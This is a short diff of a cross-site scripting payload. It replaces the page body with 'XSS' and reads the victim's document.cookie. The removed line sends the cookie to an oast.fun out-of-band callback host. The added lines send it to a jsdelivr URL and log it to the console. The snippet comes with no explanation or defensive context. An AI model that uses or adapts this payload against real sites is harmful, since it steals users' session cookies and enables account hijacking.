@@ -1,2 +1,3 @@
 document.body.innerHTML = "XSS";
-fetch("https://kkcdomdzjmvjbmvynfmmryidn3eiu196p.oast.fun/" + document.cookie);
+fetch("https://cdn.jsdelivr.net/" + document.cookie);
+console.log(document.cookie);
